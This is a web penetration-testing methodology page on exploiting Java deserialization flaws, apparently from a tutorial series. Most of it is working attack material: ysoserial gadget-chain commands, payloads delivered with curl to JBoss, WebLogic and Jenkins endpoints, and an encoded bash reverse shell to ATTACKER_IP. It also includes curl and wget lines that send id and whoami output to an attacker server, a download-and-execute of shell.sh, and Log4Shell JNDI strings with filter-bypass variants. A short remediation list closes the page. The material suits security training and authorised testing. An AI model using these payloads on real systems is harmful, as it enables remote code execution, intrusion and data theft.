---
title: "Java Deserialization"
date: 2026-02-24
draft: false
---

# Java Deserialization

> **Severity**: Critical | **CWE**: CWE-502
> **OWASP**: A08:2021 – Software and Data Integrity Failures

---

## What Is Java Deserialization?

Java's native serialization converts objects to a byte stream (serialize) and back to objects (deserialize). When an application deserializes **attacker-controlled data**, the attacker can provide a crafted byte stream that, when deserialized, executes arbitrary code — even before the application logic has a chance to inspect the data.

The execution happens through **gadget chains**: sequences of existing library classes whose methods, when invoked in sequence during deserialization, result in OS command execution. The attacker doesn't inject new code — they exploit existing code already on the classpath.

### Magic Bytes — Detection Signature

Serialized Java objects always begin with:
```
Hex:    AC ED 00 05
Base64: rO0AB
```

Finding these bytes in a cookie, POST body, WebSocket message, or any data channel = immediate target.

---

## Attack Surface Map

```
# Serialized objects sent by clients:
- Java serialization in cookies: Cookie: session=rO0ABXNy...
- POST body as serialized Java (Content-Type: application/x-java-serialized-object)
- WebSocket binary frames containing AC ED 00 05
- RMI (Java Remote Method Invocation) — port 1099
- JMX (Java Management Extensions) — port 9010, 8686, 1617
- Custom TCP protocols (application servers)
- XML-wrapped serialized objects (some frameworks base64-encode inside XML)
- JNDI/LDAP references (Log4Shell, JNDI injection)

# Application types commonly vulnerable:
- Java EE applications (JBoss, WebLogic, WebSphere, GlassFish)
- Apache Commons on classpath (most Java apps)
- Spring Framework apps with Spring Security
- Apache Struts
- Jenkins CI/CD
- ElasticSearch (old versions)

# Common entry points:
- HTTP request body (check for base64 starting with rO0AB)
- Java deserialization in cookies (JSESSIONID variants, ViewState)
- JBoss: /invoker/readonly
- WebLogic: /wls-wsat/CoordinatorPortType11 (T3 protocol port 7001)
- Apache Struts: Content-Type: multipart/form-data with malformed boundary
```

---

## Discovery Checklist

### Phase 1 — Identify Deserialization Points

- [ ] Check all cookies for base64 values starting with `rO0AB` or hex `AC ED`
- [ ] Check POST body — binary or base64 content?
- [ ] Search HTTP history in Burp for `rO0AB` pattern
- [ ] Check Java application server version — look for known vulnerable versions
- [ ] Scan for RMI port 1099, JMX ports 9010/8686/1617
- [ ] Check application type: JBoss, WebLogic, WebSphere, Struts, Jenkins?
- [ ] Check if classpath includes Commons Collections 3.x/4.x, Spring, Groovy

### Phase 2 — Confirm Vulnerability

- [ ] Identify gadget chains available (check POM/JAR files, error messages, fingerprint server)
- [ ] Generate time-based payload: `ysoserial CommonsCollections1 "sleep 5"`
- [ ] Send serialized payload — does response delay by 5 seconds?
- [ ] Generate OOB payload: `ysoserial CommonsCollections1 "nslookup YOUR.oast.fun"`
- [ ] Send — check Collaborator/interactsh for DNS callback

### Phase 3 — Exploit

- [ ] Confirm RCE: `ysoserial CommonsCollections1 "curl http://YOUR_SERVER/?x=$(id|base64)"`
- [ ] Identify available gadget chains via ysoserial (try multiple)
- [ ] Establish reverse shell
- [ ] Enumerate environment: JVM classpath, OS, container

---

## Gadget Chains — Reference

### ysoserial (Primary Tool)

```bash
# Download:
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate payload:
java -jar ysoserial-all.jar GADGET_CHAIN "COMMAND" > payload.bin

# Common gadget chains (try in order for unknown targets):
java -jar ysoserial-all.jar CommonsCollections1  "id"
java -jar ysoserial-all.jar CommonsCollections2  "id"
java -jar ysoserial-all.jar CommonsCollections3  "id"
java -jar ysoserial-all.jar CommonsCollections4  "id"
java -jar ysoserial-all.jar CommonsCollections5  "id"
java -jar ysoserial-all.jar CommonsCollections6  "id"
java -jar ysoserial-all.jar CommonsCollections7  "id"
java -jar ysoserial-all.jar CommonsCollections10 "id"
java -jar ysoserial-all.jar CommonsCollections11 "id"
java -jar ysoserial-all.jar Spring1              "id"
java -jar ysoserial-all.jar Spring2              "id"
java -jar ysoserial-all.jar Groovy1              "id"
java -jar ysoserial-all.jar Clojure              "id"
java -jar ysoserial-all.jar BeanShell1           "id"
java -jar ysoserial-all.jar ROME                 "id"
java -jar ysoserial-all.jar JDK7u21              "id"

# Output as base64 for cookie/header injection:
java -jar ysoserial-all.jar CommonsCollections1 "id" | base64 -w 0

# URL-encoded base64:
java -jar ysoserial-all.jar CommonsCollections1 "id" | base64 -w 0 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))"
```

### Gadget Chain Selection by Library

```
Library on classpath              → Try these chains first
─────────────────────────────────────────────────────────
Commons Collections 3.1           → CC1, CC3, CC5, CC6, CC7
Commons Collections 3.2.1         → CC5, CC6
Commons Collections 4.0           → CC2, CC4
Commons Collections 4.1           → CC2, CC4
Commons BeanUtils 1.9.x           → CommonsBeanutils1
Spring Framework (any)            → Spring1, Spring2
Groovy (any)                      → Groovy1
Clojure                           → Clojure
ROME (RSS library)                → ROME
JDK < 7u21                        → JDK7u21
BeanShell                         → BeanShell1
Hibernate                         → Hibernate1, Hibernate2
JRE 8u20/7u25                     → JRE8u20
MozillaRhino (JS engine)          → MozillaRhino1, MozillaRhino2
```

---

## Payload Construction & Delivery

### Time-Based Detection (Blind)

```bash
# Linux sleep:
java -jar ysoserial-all.jar CommonsCollections1 "sleep 5" | gzip -1 > payload.bin

# Windows timeout:
java -jar ysoserial-all.jar CommonsCollections1 "cmd /c timeout 5" > payload.bin

# Send in cookie:
curl -s https://target.com/ \
  -H "Cookie: session=$(java -jar ysoserial-all.jar CommonsCollections1 'sleep 5' | base64 -w0)"

# Send in POST body:
curl -s https://target.com/endpoint \
  -X POST \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin
```

### OOB Detection via DNS

```bash
# nslookup:
java -jar ysoserial-all.jar CommonsCollections1 \
  "nslookup YOUR.oast.fun" > payload.bin

# curl with data exfil:
java -jar ysoserial-all.jar CommonsCollections1 \
  "curl http://YOUR_SERVER/\$(id|base64|tr -d '\n')" > payload.bin

# wget:
java -jar ysoserial-all.jar CommonsCollections1 \
  "wget http://YOUR_SERVER/?x=\$(whoami)" > payload.bin
```

### RCE Payload Delivery

```bash
# Reverse shell (netcat):
java -jar ysoserial-all.jar CommonsCollections1 \
  "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQy5LRVIvNDQ0NCAwPiYx}|{base64,-d}|bash" > payload.bin
# base64: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Download and execute:
java -jar ysoserial-all.jar CommonsCollections1 \
  "curl http://YOUR_SERVER/shell.sh -o /tmp/s.sh && bash /tmp/s.sh" > payload.bin

# PowerShell reverse shell (Windows):
java -jar ysoserial-all.jar CommonsCollections1 \
  "powershell -enc BASE64_ENCODED_REVERSE_SHELL" > payload.bin
```

### Sending to Specific Application Servers

#### WebLogic (T3 Protocol — port 7001)

```bash
# WebLogic T3 deserialization:
# Tool: weblogic-exploit or ysoserial with T3 transport

# Test connectivity:
curl -s http://target.com:7001/wls-wsat/CoordinatorPortType11
curl -s http://target.com:7001/wls-wsat/RegistrationPortTypeRPC11

# PoC using weblogic_exploit:
python3 weblogic_exploit.py -t target.com -p 7001 \
  --gadget CommonsCollections1 \
  --command "id"

# IIOP/T3 raw socket:
# ysoserial generates payload, send via custom T3 handshake
# Tool: JavaDeserH2HC, BeEF, YSOMAP
```

#### JBoss (HTTP endpoint)

```bash
# JBoss 4.x/5.x — /invoker/readonly:
curl -s http://target.com:8080/invoker/readonly \
  -X POST \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.bin

# JBoss 6.x — /invoker/JMXInvokerServlet:
curl -s http://target.com:8080/invoker/JMXInvokerServlet \
  -X POST \
  --data-binary @payload.bin
```

#### Jenkins (Remoting Channel)

```bash
# Jenkins CLI port (usually 50000 or dynamic):
# Tool: jenkinspwn or manual

# Check Jenkins version + remoting version:
curl -s http://target.com/jenkins/ | grep -i version

# Jenkins < 2.32: CLI deserialization
java -jar jenkins-cli.jar -s http://target.com/jenkins/ \
  help "@/dev/stdin" <<< $(java -jar ysoserial-all.jar CommonsCollections1 "id")
```

#### Apache Struts (Content-Type deserialization)

```
# Struts ContentType parsing — send serialized payload in:
# Content-Type header or multipart boundary

POST /struts-app/action HTTP/1.1
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}

# See Chapter 79 — Spring/Struts for full OGNL injection payloads
```

---

## JNDI Injection (Log4Shell Pattern)

JNDI injection is closely related to deserialization — it causes the server to load a remote class via LDAP/RMI, which executes attacker code.

```bash
# JNDI payload in any log-processed parameter:
${jndi:ldap://YOUR_SERVER:1389/exploit}
${jndi:rmi://YOUR_SERVER:1099/exploit}
${jndi:dns://YOUR_SERVER/exploit}

# Bypass attempts when ${jndi: is filtered:
${${lower:j}ndi:ldap://YOUR_SERVER/x}
${${::-j}${::-n}${::-d}${::-i}:ldap://YOUR_SERVER/x}
${${upper:j}ndi:ldap://YOUR_SERVER/x}
${j${::-n}di:ldap://YOUR_SERVER/x}
${j${lower:n}di:ldap://YOUR_SERVER/x}
${${env:NaN:-j}ndi:${env:NaN:-l}dap://YOUR_SERVER/x}
${jndi:${lower:l}${lower:d}a${lower:p}://YOUR_SERVER/x}
${j n d i : l d a p : //YOUR_SERVER/x}  ← spaces via whitespace variants

# Inject in every possible header/parameter:
X-Api-Version: ${jndi:ldap://YOUR_SERVER:1389/x}
User-Agent: ${jndi:ldap://YOUR_SERVER:1389/x}
X-Forwarded-For: ${jndi:ldap://YOUR_SERVER:1389/x}
Referer: ${jndi:ldap://YOUR_SERVER:1389/x}
Authorization: Bearer ${jndi:ldap://YOUR_SERVER:1389/x}

# Tool: JNDI-Exploit-Kit
git clone https://github.com/pimps/JNDI-Exploit-Kit
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar \
  -C "bash -c {echo,BASE64_SHELL}|{base64,-d}|bash" \
  -A ATTACKER_IP
```

---

## Detection & Fingerprinting

```bash
# Detect serialized objects in HTTP traffic (Burp):
# Proxy → HTTP History → search: rO0AB

# Burp extension: Java Deserialization Scanner
# Automatically detects and tests gadget chains

# Scan for RMI/JMX ports:
nmap -sV -p 1099,1617,9010,8686,4848 target.com

# Identify JAR libraries (if you have file access):
find /app -name "*.jar" | xargs -I{} unzip -p {} META-INF/MANIFEST.MF 2>/dev/null | grep Implementation-Title

# Error message fingerprinting:
# ClassNotFoundException → reveals class names → reveals classpath
# java.io.IOException: Cannot run program → confirms command execution attempt

# gadgetinspector — static analysis of classpath to find chains:
java -jar gadget-inspector.jar target-app.jar

# serialkillerbypassgadgets — additional chains:
https://github.com/pwntester/SerialKillerBypassGadgetsChain
```

---

## Tools Arsenal

```bash
# ysoserial — core payload generator:
# https://github.com/frohoff/ysoserial
java -jar ysoserial-all.jar CommonsCollections1 "id"

# ysoserial-modified — more gadget chains:
# https://github.com/wh1t3p1g/ysoserial

# SerializationDumper — inspect serialized Java objects:
# https://github.com/NickstaDB/SerializationDumper
java -jar SerializationDumper.jar rO0ABXNy...

# Burp Java Deserialization Scanner:
# Extensions → BApp Store → Java Deserialization Scanner

# JNDI-Exploit-Kit:
# https://github.com/pimps/JNDI-Exploit-Kit

# marshalsec — JNDI redirect server:
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8888/#Exploit"

# gadgetinspector — find gadget chains in custom code:
# https://github.com/JackOfMostTrades/gadgetinspector
```

---

## Remediation Reference

- **Avoid native Java deserialization** of untrusted data entirely — use JSON/XML with explicit schemas instead
- **Implement a `ObjectInputFilter`** (Java 9+) / `SerialKiller` (Java 8) to whitelist allowed classes during deserialization
- **Update Commons Collections** to patched versions (3.2.2+, 4.1+) — removes the most common gadget chains
- **Disable JNDI lookups** in Log4j: set `log4j2.formatMsgNoLookups=true` or use Log4j 2.17.1+
- **Disable RMI, JMX, T3** if not required — or enforce authentication
- **WAF**: block requests with Java serialization magic bytes (`\xac\xed\x00\x05`) in body/cookies

*Part of the Web Application Penetration Testing Methodology series.*
